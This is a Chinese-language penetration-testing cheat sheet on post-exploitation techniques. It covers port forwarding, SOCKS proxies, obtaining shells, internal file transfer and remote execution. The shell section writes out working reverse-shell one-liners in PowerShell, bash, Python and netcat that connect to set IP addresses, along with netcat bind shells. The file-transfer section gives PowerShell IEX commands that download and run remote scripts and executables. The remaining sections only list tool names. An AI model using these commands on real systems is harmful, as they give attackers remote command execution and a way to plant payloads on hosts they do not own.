综合技巧
========================================

端口转发
----------------------------------------
- windows
    - lcx
    - netsh
- linux
    - portmap
    - iptables
- socket代理
    - Win: xsocks
    - Linux: proxychains
- 基于http的转发与socket代理(低权限下的渗透)
    - 端口转发: tunna
    - socks代理: reGeorg
- ssh通道
    - 端口转发
    - socks

获取shell
----------------------------------------
- 常规shell反弹

windows下:
::

    $client = New-Object System.Net.Sockets.TCPClient("10.10.14.32",5711);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Linux下:

::

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

- 突破防火墙的icmp_shell反弹
- 正向shell

::

    nc -e /bin/sh -lp 1234
    nc.exe -e cmd.exe -lp 1234

内网文件传输
----------------------------------------
- windows下文件传输
    - powershell
        - ``IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.32:1633/shell.sp1")``
        - ``IEX (New-Object Net.WebClient).DownloadFile("http://10.10.14.32:1633/1633.exe", "C:\users\sql_svc\Desktop\1633.exe")``
    - vbs脚本文件
    - bitsadmin
    - 文件共享
    - 使用telnet接收数据
    - hta
- linux下文件传输
    - python
    - wget
    - tar + ssh
    - 利用dns传输数据
- 文件编译
    - powershell将exe转为txt，再txt转为exe

远程连接 && 执行程序
----------------------------------------
- at&schtasks
- psexec
- wmic
- wmiexec.vbs
- smbexec
- powershell remoting
- SC创建服务执行
- schtasks
- SMB+MOF || DLL Hijacks
- PTH + compmgmt.msc
